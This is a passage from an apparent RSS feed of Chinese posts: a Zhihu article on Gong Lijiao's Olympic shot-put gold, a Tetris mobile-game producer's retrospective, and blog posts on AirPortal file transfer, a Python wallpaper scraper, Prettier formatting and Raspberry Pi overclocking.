data-original-src=\"v2-70b7f6dcfa6b38cb4e0bfcef93c8271a\" data-watermark-src=\"v2-2cf0ac8a1db537d5df933da3b34af29f\" data-private-watermark-src=\"v2-fdf5f4f819c8914677497cfe0630bd85\"></p>\n<p>唯一让巩立姣失望的是世锦赛的成绩，仅仅投出19.55米，仅比亚军托马斯-多德多了8厘米，创下史上最低夺冠成绩，在此之前世锦赛的最低夺冠成绩是1999年的19.85米。即便如此，巩立姣依然对东京奥运的前景保持乐观，“这个冠军对我也是一种鼓励，让我更加自信。状态这么差都能拿下冠军，等我恢复状态肯定就更没有问题了。”</p>\n<p>虽然过去几年罕有敌手，但是巩立姣丝毫不敢懈怠，一直在尝试调整自己的技术动作。在女子铅球的顶尖选手中，巩立姣的身高和体重并没有优势，她只能在技术层面追求极致。</p>\n<p>外教克拉克执教期间，巩立姣对步伐和步频进行了修正，同时加强了体能储备。到了东京周期的冲刺阶段，巩立姣的训练重点变成了调整滑步距离，让动作变得更舒展。为了把改动作的风险降到最低，田径队专门请来了美国的心理专家，调整巩立姣的心态。</p>\n<p>2019年12月，收到那枚迟到11年的奥运奖牌之后，巩立姣在北京体育大学进行了一场题为《冠军》演讲，她表示为了回应外界的质疑，夺取东京奥运会的金牌是她必须做出的回应。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-228cfbcd57a9a3129cde37a0be62d929_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"326\" data-watermark=\"original\" data-original-src=\"v2-228cfbcd57a9a3129cde37a0be62d929\" data-watermark-src=\"v2-c67005c5e8cb39c8cb40a61bf0cedd06\" data-private-watermark-src=\"v2-f7133710e7f63fe9d19b1882777d17f3\"></p>\n<p><br>就在巩立姣按部就班进行备战时，东京奥运会宣布延期，对任何一个老将而言，这都不是一个好消息。“当时那个月，我觉得整个人都垮掉了。”巩立姣回忆，“因为那一年我练得很好，2月份时成绩就突破了20米，那时候眼里只有奥运会。”</p>\n<p>备战计划的调整让巩立姣的身体亮起了红灯，左膝出现了严重的水肿，连走路都成了问题，只能坐着投球，她觉得天都塌了下来。在北京体育大学那间小宿舍里，巩立姣把事情想开了，“幸好不是取消，延期我也没事，虽然体力、体能可能会有所下降，但好事多磨，我又多了一些时间去准备，就更十拿九稳了，我会争取把最好的状态留到明年。”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-559b3599f9ac2243ba058d79d246f421_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"1365\" data-watermark=\"original\" data-original-src=\"v2-559b3599f9ac2243ba058d79d246f421\" data-watermark-src=\"v2-4a9111b6bf769a3f172cae6cc57f7c1a\" data-private-watermark-src=\"v2-56d3b1c355ea3faea50d8c3c0b254893\"></p>\n<p>巩立姣没有食言，今年她在参加的7场比赛里，有两场的成绩都超过了20米。6月中旬在绍兴举办的奥运选拔赛中，巩立姣投出20.31米，创下本赛季世界最好成绩。十几天后，巩立姣在全运会选拔赛中更进一步，投出了20.39米，创下个人生涯第二好成绩。值得一提的是，她在这次比赛中有三次试投超过20米。“我感觉已经把奥运会金牌装兜里了，挂在这呢，一伸手就拿到了。”</p>\n<p>今年5月，奥委会官网对巩立姣进行了专题报道，文中提到，21这个数字对她有着特别的意义：奥运会延迟到2021年，今年是她从事铅球的第21个年头，而她的目标是突破21米。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0c8703afdd23adfcffb3caf503052f2a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"367\" data-watermark=\"original\" data-original-src=\"v2-0c8703afdd23adfcffb3caf503052f2a\" data-watermark-src=\"v2-814eeffe59297b3cd517c5b0b54118ff\" data-private-watermark-src=\"v2-fe6679891e8d26c3dcb04a26382ede60\"></p>\n<p><br>出征东京之前，巩立姣发了一条微博：“第四次参加奥运会，稳扎稳打，决胜东京，为国争光。”这一次，她终于做到了，在登上领奖台的那一刻，她的耳边一定响起了刘德华的那首歌：“等了好久终于等到今天，梦了好久终于把梦实现。”</p>\n<p>********</p>\n<p>卑微的贴二维码求关注我们的小破号：后厂村体工队</p>\n<p><img src=\"https://pic3.zhimg.com/v2-45c3be1acccc90aaca7c5418d388aa34_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"346\" data-watermark=\"original\" data-original-src=\"v2-45c3be1acccc90aaca7c5418d388aa34\" data-watermark-src=\"v2-e810e32a9b273de5249d0fa76d8daca8\" data-private-watermark-src=\"v2-16c4bcdabd4ea616588c61802f8468f1\" data-qrcode-value=\"http://weixin.qq.com/r/rnVCWl3EYgAdrRk59yC8\" data-tags=\"qrcode\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yi-ti-yu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">网易体育</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476454230/answer/2032146937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">203 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/477421696?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待2020东京奥运会美国男子接力没有进入决赛？</a><br><a href=\"http://www.zhihu.com/question/475915462?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会体操女子个人全能决赛唐茜靖第 7 芦玉菲第 18 ？</a><br>\n","link":"http://www.zhihu.com/question/476454230/answer/2032146937?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价手游《俄罗斯方块环游记》？","date":"2021-07-31 15:30:07","description":"\n<p><b>大家好，我是《俄罗斯方块环游记》的制作人Poly，感谢@知乎游戏 的邀请。大家看到这个答案的时候《俄罗斯方块环游记》已经上线了，但这个答案中的很多故事、想法、感慨已经在心里酝酿了很久，很高兴有这个机会能够转化为文字跟大家分享。</b></p>\n<p>1、立项初衷</p>\n<p>我是个健忘的人，当要开始写这段故事的时候，我下意识的翻了一下2017年年底的照片以帮助我回忆。看了会照片后我想起很多事情，比如那时候我还一根白头发没有，养了一只叫布丁的花枝鼠，姥姥还在。</p>\n<p>刚接触Tetris时，它最吸引我们团队的地方是和一般的IP，例如故事、角色形象不一样，Tetris是一个家喻户晓的玩法。而我们又是一群特别喜欢设计新玩法的团队，我能想象也期望着它的变化与玩法延展能给我们一个大的发挥空间，这是件令人兴奋的事情。我用了一个月的时间来研究现代俄罗斯方块的各个版本，深入研究后，我发现原来在国外俄罗斯方块已经在各种平台上演变出了大小玩法上百种的新内容和规则变化，而这些新模式我们在国内很多人之前都没有玩到过。所以我当时我就很希望这款手游能承载这个小目标，能让国人玩到这些新内容，能给大家带来一些关于俄罗斯方块的惊喜。</p>\n<p><b>2、初次测试反馈</b></p>\n<p>第一个版本是在开发几个月时候在tap上测试的，这是一个完全创新，又有些“放飞自我“的版本。我记得几个月前和模电一起吃饭，临走时候他和我说，第一个版本是他最喜欢的版本。我不想对此发表我的想法，但是我理解他的意思。那是一个纯粹的tetis粉丝版本，那个版本有点小众。我记得当时每天都在看玩家的反馈，每晚到凌晨还在看玩家在世界频道说什么。总结来说，那个版本偏难。手感也有很多问题，如果是经常接触现代俄罗斯方块的玩家会觉得难度刚刚好，且他们对我们游戏当时的操作有很高的包容性。但是对于绝大多数新玩家来说，游戏的关卡设计太偏向解密性质了，而且那个版本当时还没来及做充足的新手指引。这让很多玩家在前期关卡卡住而消失。测试后的数据很不理想，我大概自闭了5天左右，不想和任何人说话。我把大家反馈的问题记录下来，写了很长的一个反思文，嗯….一个土黄色的PPT长文。以用于后续的版本调整。</p>\n<p>后面随着调整和优化，测试的数据也在逐步变好。我想和所有反馈给环游记建议的玩家说一声：谢谢…这句苍白的话是真诚的。</p>\n<p><b>3、在PVE和PVP中抉择</b></p>\n<p>虽然说如果问大家说是否知道俄罗斯方块，大家可能很多人都说知道，也会说会玩。但是我们的调研发现，大部分同学对于俄罗斯方块的认知，还是处于很早前的那个游戏机上的原始版本。对于俄罗斯方块如何对战，如何攻击对手，如何KO对手，还是比较模糊的。之前我们做过一次以PVP为起始的版本，数据不是很理想，其主要原因有2个，上面我说的是其中一个，就是大家会玩俄罗斯方块，但是不知道如何去击败对手。而俄罗斯方块的攻击规则又相对比较复杂，它和你的操作效率成正比。加上大家在之前也很少在手机上练习俄罗斯方块的操作手速，这2个问题抬高了玩家参与PVP的上手难度。玩家会因为手速和脑速不符在前期很容易在PVP中出现挫败感，而这种挫败感会让体验的玩家感到不适。</p>\n<p>所以在经过多次测试后，我们将更加简单、轻松的PVE关卡放在了游戏体验的开始。大家可以先了解规则，使用操作，熟练操作，然后再逐步解锁PVP的各个系统。</p>\n<p>当然，为了让喜欢俄罗斯方块竞技的老手们快速的体验到他们想玩的内容，我们的PVP解锁不仅可以通过打关卡和等级，也可以通过在经典马拉松中测试手速，如果手速达到标准，可以直接解锁竞技！</p>\n<p><b>4、上线后的一些感慨</b></p>\n<p>希望大家对小环游能多一些耐心和包容。因为俄罗斯方块环游记的整个开发并没有很好的前车之鉴，我们在整个近4年的的设计与开发就像一条没有路的登山一样，一直是在不停的探索、摸索，但我们是用真心在做这个游戏。我常常和研发同学说，游戏作为一种娱乐性质的产品，只有你自己快乐，才能把它流露在游戏中，让大家体验到快乐。但是很遗憾，虽然这一路开发环游记我们很沉迷和喜爱这个过程，但是这个过程也有很多迷茫的时候，困难不断，我们常常也会遇到很多挫折和受挫，而这些五味杂陈的情感可能也多多少少进入了游戏的设计细胞中，我认为它不一定是件坏事，因为有了这些苦辣酸甜感，或许会让环游记的故事变得更加饱满。但是呢，在环游记骨子里，它依然是那个儿时的少年，像三十多年前它带给大家快乐，让大家沉浸于码块，那个超越国界，超越种族，让全世界都喜欢的那个正能量的”小朋友“，真心的希望大家在上线后对小环游多多包容它,多多支持它~</p>\n<p>最后，我想谢谢一路陪伴我们测试的方块超人们，这3年多来你们的反馈，你们的鼓励，一直是我们前方的灯。可能你们不知道，有好多好多好多的时光里，当我们开发出现困境的时候，我们常常会内部相互转发你们在评论里给我们的鼓励，包括一直督促我们抓紧上线，督促我们抓紧优化，我们其实每一条评论都看了....这一路虽然很艰难，但是我总和身边的大家说：有喜欢你游戏的人，是一种荣幸，无论人多人少，我们都要珍惜喜欢它的每一个玩家。因为是广大方块超人们的鼓励，让我们一直坚持下来。</p>\n<p>鞠躬+敬礼(^^ゞ！！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b0933ed8a45cf6a1e8eb39c6827ab2e1_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"290\" data-rawheight=\"234\" data-watermark=\"watermark\" data-original-src=\"v2-b0933ed8a45cf6a1e8eb39c6827ab2e1\" data-watermark-src=\"v2-282379d843e5346f3a161ae121cf8638\" data-private-watermark-src=\"v2-c68fa1807555b2d71e4fbc87cd182281\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/waltz-68?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Poly</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470408812/answer/2027319600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20401449?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你会怎样向一个从没玩过俄罗斯方块的人解释这个游戏的玩法？</a><br><a href=\"http://www.zhihu.com/question/28928581?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么国内连连看比俄罗斯方块火得多？</a><br>\n","link":"http://www.zhihu.com/question/470408812/answer/2027319600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何免费不限速传输文件？你应该试试 AirPortal！","date":"2021-07-30 10:50:00","description":"\n<p>微信传输限制 200M （电脑端 1GB），某度网盘的限速实在离谱。</p>\n<p>那么，如何快速、简单的传输文件呢？</p>\n<p>AirPortal 可以解决这个难题！</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E5%85%A8\" class=\"headerlink\" title=\"安全\"></a>安全</h2>\n<p>可以设置取件密码，在输入取件码的同时还要输入密码，进一步保护文件安全。</p>\n<p>可以设置下载次数，达到一定下载次数时自动从服务器上删除文件，无法下载。</p>\n<p>可以设置保存小时数，超过时间后自动从服务器上删除文件，无法下载。</p>\n<p>当用户多次输入错误的取件码时，将自动弹出验证码，核实是否为真实用户。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/c6da584dd68d5.png\"><h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E4%BE%BF%E5%BF%AB%E9%80%9F\" class=\"headerlink\" title=\"方便快速\"></a>方便快速</h2>\n<p>AirPortal 不限速，提供多地区服务器下载。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/2194e7359dab2.png\"><p>无论是否是高级用户，都将文件存储在 OSS，提高服务可用性与下载速度。</p>\n<p>无需多余的步骤，打开客户端或网页版输入取件码和密码（如有设置）就可以下载。</p>\n<p>在两台设备上登录同一个账号后，在其中任意一台设备上传文件，在另一台设备上会自动询问是否接收，无需输入取件码。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%85%8D%E7%99%BB%E5%BD%95%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"免登录使用\"></a>免登录使用</h3>\n<p>AirPortal 可以免登录使用，以下是一些限制：</p>\n<table>\n<thead><tr>\n<th align=\"center\">未登录</th>\n<th align=\"center\">免费</th>\n<th align=\"center\">高级</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">10GB + 结余</td>\n</tr>\n<tr>\n<td align=\"center\">单次上传 1GB</td>\n<td align=\"center\">单次上传 2GB</td>\n<td align=\"center\">无限</td>\n</tr>\n</tbody>\n</table>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/1b7b87e798158.png\"><h3>\n<a href=\"https://blog.yfun.top/#%E7%AE%80%E6%B4%81%E7%9A%84%E9%A1%B5%E9%9D%A2\" class=\"headerlink\" title=\"简洁的页面\"></a>简洁的页面</h3>\n<p>没有花里胡哨的广告和弹窗，简洁明了，点击「发送」就可以发送文件或文字。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/3aa77007547f5.png\"><h3>\n<a href=\"https://blog.yfun.top/#Wi-Fi-%E5%BF%AB%E4%BC%A0\" class=\"headerlink\" title=\"Wi-Fi 快传\"></a>Wi-Fi 快传</h3>\n<p>在同一局域网下，使用客户端开启「Wi-Fi 快传」功能，文件传输不经过热铁盒服务器与公网，更快速，更安全。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%85%B1%E4%BA%AB\" class=\"headerlink\" title=\"剪贴板共享\"></a>剪贴板共享</h3>\n<p>基于 Wi-Fi 快传的剪贴板共享功能，可以轻松实现跨设备复制粘贴，零延迟，支持多种操作系统。</p>\n<p>（需要同时打开客户端并连接 Wi-Fi 快传，iOS 端将会以文本方式同步到客户端）</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%A4%9A%E5%B9%B3%E5%8F%B0\" class=\"headerlink\" title=\"多平台\"></a>多平台</h2>\n<p>拥有 iOS, 安卓, Windows, macOS 与 Linux 平台的客户端，其余平台也可以使用 网页端。</p>\n<p>官方网址：<a href=\"https://airportal.cn/\">https://airportal.cn/</a></p>\n<p>*: 感谢 AirPortal 空投的支持！</p> ","link":"https://blog.yfun.top/posts/2021/airportal/"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 